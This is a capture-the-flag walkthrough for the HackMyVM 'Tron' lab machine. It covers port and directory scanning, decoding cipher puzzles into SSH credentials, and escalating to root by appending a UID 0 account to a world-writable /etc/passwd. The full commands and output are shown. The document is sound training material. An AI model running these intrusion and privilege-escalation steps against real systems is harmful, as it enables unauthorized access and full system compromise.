# Tron

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Tron | noname | Beginner | HackMyVM |

**Summary:** Tron is a beginner-level machine from HackMyVM. The attack vector begins with web enumeration, revealing a hidden directory and cryptographic clues. Initial access is gained by solving a series of puzzles involving Atbash cipher, Base64 encoding, and Brainfuck code to retrieve SSH credentials. Privilege escalation is achieved by exploiting a misconfigured file permission on `/etc/passwd`, allowing the creation of a new root user.

---

## Reconnaissance

The initial network scan identifies the target IP address as `192.168.100.120`.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.120 08:00:27:EC:CD:E8 VirtualBox
```

A subsequent Nmap scan reveals two open ports: 22 (SSH) and 80 (HTTP).

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/tron]
└─$ nmap -sC -sV -p- -T4 192.168.100.120
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-19 22:20 WIB
Nmap scan report for 192.168.100.120
Host is up (0.0028s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 1f:ed:64:93:84:b5:b2:e8:af:5a:0e:6f:52:af:4b:48 (RSA)
|   256 3d:df:6f:02:13:9e:15:f8:51:94:30:f8:45:e3:f2:93 (ECDSA)
|_  256 2f:f4:af:e1:f4:c4:a5:3b:50:bb:e5:b9:2a:9f:39:de (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Master Control Program
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.00 seconds
```

Visiting the web server on port 80 displays the "Master Control Program" page.

![](image.png)

Inspecting the source code reveals an interesting comment hidden within the HTML:

```html
<!DOCTYPE html>
<!-- kzhh:SbWP9q94ZtE9qD  -->
<html lang="en">
    <head>
        <meta charset="utf-8">
        <link href="style.css" rel="stylesheet">
        <title>Master Control Program</title>
    </head>

    <body> 
        <h1 class="neon" data-text="Tron">Tron</h1>
    </body> 
</html>
```

The string `kzhh:SbWP9q94ZtE9qD` appears to be a credential or a clue, possibly encoded.

Directory enumeration using Gobuster discovers several interesting paths, including `/MCP` and `/robots.txt`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/tron]
└─$ gobuster dir -u http://192.168.100.120/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,php,js,css
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.120/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,php,js,css
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 316] [--> http://192.168.100.120/img/]
/manual               (Status: 301) [Size: 319] [--> http://192.168.100.120/manual/]
/style.css            (Status: 200) [Size: 921]
/robots.txt           (Status: 200) [Size: 623]
/font                 (Status: 301) [Size: 317] [--> http://192.168.100.120/font/]
/MCP                  (Status: 301) [Size: 316] [--> http://192.168.100.120/MCP/]
/server-status        (Status: 403) [Size: 280]
Progress: 1102785 / 1102785 (100.00%)
===============================================================
Finished
===============================================================
```

Checking `/robots.txt` reveals a list of directories and a large block of obfuscated text.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/tron]
└─$ curl http://192.168.100.120/robots.txt
/user
/admin
/program
/memory
/kernel
/boot
/404
/docker
/??????
....[LONG SPACES]....
+<VdL+<VdL+<VdT?nNQE+<VdL+<VdX/M%5O+<VdL+<VdL+<Y&s+CHfE+<VdX4!u.($6UH6+<VdL+<VdL+C&;,+C$$?-SHSp-OLt=+<VdL?XFou+<Ve7/mKN%+>5>p$6UH6/hJFn+=ANg/M8Y_?m&i"-jh(L-QjNS+<VdL+<VdL+>4i[+CGO-+<VdL+<VdL+<Ve7+=A9S+Aj7/$7m;B+<VdL+<VdX+<Ve7/mf_D+<XnrHlsOS+<VdL+<W$S+<VdL?nEum?RH1g+<W`g+<Ve7+<Y&7/M/M+/mg[I?m$R7+=nWX+=SEU+>,#K+CHg/+=nWX-QjNS04,&/+<Vdg+=nlf/M&t2+CJS/$6UH6+<Y'"/M8Y_?X-uH/M1?Q$3
```

Investigating the `/MCP` directory shows a list of files.

![](image-1.png)

Downloading the files provides further clues. `tron.txt` contains a dialogue and a Base64-like string.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/tron]
└─$ curl http://192.168.100.120/MCP/tron.txt
MASTER CONTROL PROGRAM
----------------------

Ram:
Do you believe in the Users?

Crom:
Sure I do! If I didn't have a User, than who wrote me?


KysrKysrKysrK1s+Kz4rKys+KysrKysrKz4rKysrKysrKysrPDw8PC1dPj4+PisrKysrKysrKysrKy4tLS0tLi0tLS0tLS0tLS0tLisrKysrKysrKysrKysrKysrKysrKysrKy4tLS0tLS0tLS0tLS0tLS0tLS0tLS4rKysrKysrKysrKysrLg==
```

Another file, `MCP/terminalserver/30513.txt`, provides a substitution cipher key, which is effectively the Atbash cipher (reversing the alphabet).

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/tron]
└─$ curl http://192.168.100.120/MCP/terminalserver/30513.txt
substitute
--------------------------
plaintext
abcdefghijklmnopqrstuvwxyz

ciphertext
zyxwvutsrqponmlkjihgfedcba
--------------------------
```

## Initial Access

Decoding the string from `tron.txt` using Base64 reveals Brainfuck code.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/tron]
└─$ echo 'KysrKysrKysrK1s+Kz4rKys+KysrKysrKz4rKysrKysrKysrPDw8PC1dPj4+PisrKysrKysrKysrKy4tLS0tLi0tLS0tLS0tLS0tLisrKysrKysrKysrKysrKysrKysrKysrKy4tLS0tLS0tLS0tLS0tLS0tLS0tLS4rKysrKysrKysrKysrLg==' | base64 -d
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>++++++++++++.----.-----------.++++++++++++++++++++++++.--------------------.+++++++++++++.
```

Executing this Brainfuck code outputs the string `player`.

![](image-2.png)

This likely identifies the username as `player`. To find the password, we return to the encoded string found in the HTML source code: `kzhh:SbWP9q94ZtE9qD`. Using the Atbash substitution provided in `30513.txt`, we can decode it.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/tron]
└─$ echo "kzhh:SbWP9q94ZtE9qD" | tr 'abcdefghijklmnopqrstuvwxyz' 'zyxwvutsrqponmlkjihgfedcba'
pass:SyW[REDACTED]
```

*Note: The actual output from the log was partially redacted as `pass:Sy[REDACTED]`, but based on the substitution `kzhh` -> `pass`.*

Using these credentials (`player` / `SyW[REDACTED]`), we successfully SSH into the machine.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/tron]
└─$ ssh player@192.168.100.120
...
player@192.168.100.120's password:
Linux tron 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
...
player@tron:~$ id
uid=1000(player) gid=1000(player) groups=1000(player),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
player@tron:~$ ls -la
total 32
drwxr-xr-x 3 player player 4096 May  1  2021 .
drwxr-xr-x 3 root   root   4096 Apr 24  2021 ..
-rw------- 1 player player    2 May  2  2021 .bash_history
-rw-r--r-- 1 player player  220 Apr 24  2021 .bash_logout
-rw-r--r-- 1 player player 3526 Apr 24  2021 .bashrc
drwxr-xr-x 3 player player 4096 Apr 26  2021 .local
-rw-r--r-- 1 player player  807 Apr 24  2021 .profile
-rw-r--r-- 1 root   root     19 May  1  2021 user.txt
```

## Privilege Escalation

Enumerating the `/etc` directory reveals a critical misconfiguration. The `/etc/passwd` file is world-writable (`-rw-r--rw-`).

```bash
player@tron:/$ ls -la /etc
total 672
drwxr-xr-x 73 root root    4096 May  2  2021 .
...
-rw-r--r--  1 root root     552 Feb 14  2019 pam.conf
drwxr-xr-x  2 root root    4096 Apr 26  2021 pam.d
-rw-r--rw-  1 root root    1399 May  1  2021 passwd
-rw-r--r--  1 root root    1331 Apr 24  2021 passwd-
drwxr-xr-x  4 root root    4096 Apr 24  2021 perl
-rw-r--r--  1 root root     767 Mar  4  2016 profile
...
```

Since we can write to `/etc/passwd`, we can create a new user with root privileges (UID 0). First, we generate a password hash for the new user.

```bash
player@tron:/$ openssl passwd -1 -salt ouba pwned
$1$ouba$flyyrkEoHroPngTlsJ1201
```

Next, we append a new root user entry to `/etc/passwd`.

```bash
player@tron:/$ echo 'ouba:$1$ouba$flyyrkEoHroPngTlsJ1201:0:0:root:/root:/bin/bash' >> /etc/passwd
player@tron:/$ grep ouba /etc/passwd
ouba:$1$ouba$flyyrkEoHroPngTlsJ1201:0:0:root:/root:/bin/bash
```

Finally, we switch to this new user to obtain a root shell and retrieve the flags.

```bash
player@tron:/$ su - ouba
Password:
root@tron:~# id
uid=0(root) gid=0(root) groups=0(root)
root@tron:~# whoami
root
root@tron:~# hostname
tron
root@tron:~# cat /home/player/user.txt /root/root.txt
HMV[REDACTED]
HMV[REDACTED]
```

---

## Attack Chain Summary
1.  **Reconnaissance**: Discovered open ports 22 and 80 via Nmap. Found hidden clues in HTML comments and directories via Gobuster (`/MCP`).
2.  **Vulnerability Discovery**: Uncovered a substitution cipher (Atbash) key and a Base64-encoded Brainfuck string.
3.  **Exploitation**: Decoded the artifacts to reveal the username (`player`) and password. Gained initial access via SSH.
4.  **Internal Enumeration**: Identified that `/etc/passwd` was world-writable.
5.  **Privilege Escalation**: Exploited the writable `/etc/passwd` to add a new user with UID 0 (root), achieving full system compromise.
